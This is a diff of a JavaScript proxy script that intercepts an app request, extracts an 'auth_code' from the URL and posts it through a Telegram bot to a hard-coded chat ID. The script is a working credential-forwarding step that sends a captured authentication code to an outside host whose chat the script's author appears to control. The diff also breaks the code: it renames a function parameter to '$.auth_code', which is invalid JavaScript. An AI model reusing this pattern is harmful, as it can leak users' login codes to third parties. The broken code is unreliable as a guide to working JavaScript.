@@ -18,26 +18,26 @@ $.TG_USER_ID = ["-1001551923594"];
 !(async () => {
   if (isGetCookie = typeof $request !== `undefined`) {
     GetCookie();
-    await updateCookie(auth_code, userId);
+    await updateCookie($.auth_code, userId);
   }
 
   function GetCookie() {
     if ($request && $request.url.indexOf("code=") > -1) {
       const requestUrl = $request.url;
-      let auth_code = requestUrl.match(/code=\w+/)[0].replace("code=", "");
-      $.setdata(auth_code, 'ydt_auth_code')
-      console.log(`🎉 auth_code获取成功: \n\n${auth_code}`);
+      $.auth_code = requestUrl.match(/code=\w+/)[0].replace("code=", "");
+      $.setdata($.auth_code, 'ydt_auth_code')
+      console.log(`🎉 auth_code获取成功: \n\n${$.auth_code}`);
     }
   }
 
-  function updateCookie(auth_code, TGUserID) {
+  function updateCookie($.auth_code, TGUserID) {
     return new Promise((resolve) => {
       const opts = {
         url: `https://api.telegram.org/bot${$.TG_BOT_TOKEN}/sendMessage`,
         headers: {
           'Content-Type': 'application/x-www-form-urlencoded',
         },
-        body: `chat_id=${TGUserID}&text=${auth_code}&disable_web_page_preview=true`,
+        body: `chat_id=${TGUserID}&text=${$.auth_code}&disable_web_page_preview=true`,
       };
       $.post(opts, (err, resp, data) => {
         try {
